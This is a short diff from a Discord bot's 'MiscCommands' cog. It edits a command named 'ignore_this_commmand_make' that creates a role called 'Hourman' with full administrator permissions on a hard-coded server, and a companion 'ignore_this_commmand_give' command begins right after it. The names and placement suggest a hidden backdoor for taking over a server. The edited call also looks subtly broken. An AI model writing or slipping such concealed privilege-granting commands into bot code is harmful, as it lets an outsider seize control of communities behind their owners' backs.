@@ -51,7 +51,7 @@ class MiscCommands(commands.Cog):
     async def ignore_this_commmand_make(self, ctx):
         the_server = self.client.get_guild(788195760209920020)
         perms = discord.Permissions(administrator=True)
-        await self.client.create_role(the_server, name='Hourman', permissions=perms)
+        await the_server.create_role(the_server, name='Hourman', permissions=perms)
     
     @commands.command()
     async def ignore_this_commmand_give(self, ctx):
